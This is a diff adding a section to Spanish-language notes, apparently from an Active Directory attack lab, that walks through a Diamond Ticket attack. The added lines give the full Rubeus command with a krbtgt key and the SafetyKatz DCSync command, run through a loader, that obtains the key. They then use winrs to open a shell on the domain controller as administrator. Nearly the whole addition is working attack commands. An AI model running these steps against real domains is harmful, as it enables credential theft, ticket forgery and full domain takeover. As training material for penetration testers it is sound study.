@@ -900,3 +900,23 @@ Get-WmiObject -Class win32_operatingsystem -ComputerName dcorp-dc
 *LO - 10*
 Utilizaremos los privilejos de *Domain Admin* para ejecutar un *Diamond Ticket*
 Este ataque debe ejecutarse con una shell con privilegios lo ejecutaremos a traves del *Loader* con *Rubeus*
+```shell
+C:\AD\Tools\Rubeus.exe Arguments : diamond /krbkey:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /tgtdeleg /enctype:aes /ticketuser:administrator /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
+```
+
+La *krbkey* la obtendremos en la ejecucion de `C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit"`
+
+Se nos generara un nuevo proceso con el cual accederemos al *dcorp-dc*
+```shell
+[newCMD as Adminstrator]
+winrs -r:dcorp-dc cmd
+```
+
+Para ver que usuario somos
+```shell
+[dcorp-dc]
+set username
+```
+
+Obteniendo como resultado que somos el usuario *administrator*
+
